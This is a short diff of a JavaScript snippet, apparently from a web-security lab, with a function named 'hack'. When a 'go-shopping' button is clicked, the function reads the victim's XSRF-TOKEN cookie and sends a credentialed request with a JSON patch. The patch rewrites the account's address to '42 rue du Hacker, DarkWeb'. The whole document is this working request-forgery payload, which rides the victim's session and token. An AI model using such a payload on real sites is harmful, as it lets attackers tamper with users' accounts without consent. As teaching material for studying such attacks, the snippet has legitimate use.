@@ -1,3 +1,5 @@
+15 rue de du meilleur des mondes, Paris
+
 <script>
 
 function getCookie(cname) {
@@ -17,8 +19,6 @@ function getCookie(cname) {
 }
 
 function hack() {
-
-var data = "[{ \"op\" : \"replace\", \"path\" : \"/address\", \"value\" : \"42 rue du Hacker, DarkWeb\"} ]";
 
 var xhr = new XMLHttpRequest();
 xhr.withCredentials = true;
@@ -40,12 +40,16 @@ xhr.setRequestHeader("cache-control", "no-cache");
 var xsrfToken = getCookie('XSRF-TOKEN');
 xhr.setRequestHeader("X-XSRF-TOKEN", xsrfToken);
 
+var data = "[{ \"op\" : \"replace\", \"path\" : \"/address\", \"value\" : \"42 rue du Hacker, DarkWeb\"} ]";
+
 xhr.send(data);
 }
 
 document.addEventListener('DOMContentLoaded', function() {
   document.getElementById('go-shopping').addEventListener('click', hack);
 }, false);
+
+
 
 
 </script>
